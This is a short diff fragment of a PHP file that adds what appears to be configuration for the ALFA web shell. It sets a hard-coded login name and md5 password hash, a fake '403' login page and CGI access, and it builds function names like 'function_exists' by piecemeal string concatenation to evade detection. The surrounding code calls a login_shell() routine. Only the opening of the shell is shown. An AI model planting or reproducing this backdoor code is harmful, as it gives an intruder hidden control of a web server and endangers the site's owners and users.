@@ -118,6 +118,19 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
         login_shell();
     }
 }
+?>
+
+<?php
+
+$GLOBALS['oZgNypoPRU'] = array(
+    'username' => 'alfa',
+    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
+    'safe_mode' => '0',
+    'login_page' => '403',
+    'show_icons' => '1',
+    'post_encryption' => false,
+    'cgi_api' => true,
+);
 
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
 $aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
